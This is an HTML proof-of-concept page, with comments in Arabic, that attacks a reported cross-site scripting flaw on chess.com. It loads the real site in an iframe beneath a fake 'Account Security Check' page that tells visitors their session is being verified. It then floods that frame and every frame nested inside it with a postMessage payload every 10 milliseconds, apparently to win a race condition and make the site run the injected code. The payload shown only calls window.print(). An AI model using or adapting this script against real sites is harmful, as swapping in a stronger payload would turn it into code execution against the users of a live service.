<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Chess.com Critical XSS PoC</title>
    <style>
        body { font-family: Arial, sans-serif; text-align: center; padding: 50px; background-color: #f4f4f4;}
        iframe { border: 2px solid #333; box-shadow: 0 0 10px rgba(0,0,0,0.5); }
    </style>
</head>
<body>
    <h1>Chess.com Account Security Check</h1>
    <p>Please wait while we verify your session...</p>
    
    <iframe id="victim_frame" src="https://www.chess.com" width="800" height="600"></iframe>

    <script>
        // Payload الإثبات البصري (نافذة الطباعة)
        let payload = "window.print(); // get_ext";

        function blastFrames(win) {
            try {
                // إرسال الرسالة لأي Iframe نقابله
                win.postMessage(payload, "*");
            } catch(e) {}
            
            // الدخول في الأعماق (Recursion)
            try {
                for (let i = 0; i < win.frames.length; i++) {
                    blastFrames(win.frames[i]);
                }
            } catch(e) {}
        }

        // تشغيل الهجوم بعد ما المتصفح يبدأ يحمل الـ Iframe
        setTimeout(() => {
            console.log("Starting the blast...");
            // نضرب كل 10 ملي ثانية عشان نكسب الـ Race Condition
            let spammer = setInterval(() => {
                let target = document.getElementById('victim_frame').contentWindow;
                if(target) {
                    blastFrames(target);
                }
            }, 10);

            // نوقف الضرب بعد 10 ثواني عشان المتصفح ميهنجش
            setTimeout(() => {
                clearInterval(spammer);
                console.log("Blasting finished.");
            }, 10000);

        }, 3000); // نستنى 3 ثواني الأول عشان الموقع يلحق يفتح
    </script>
</body>
</html>
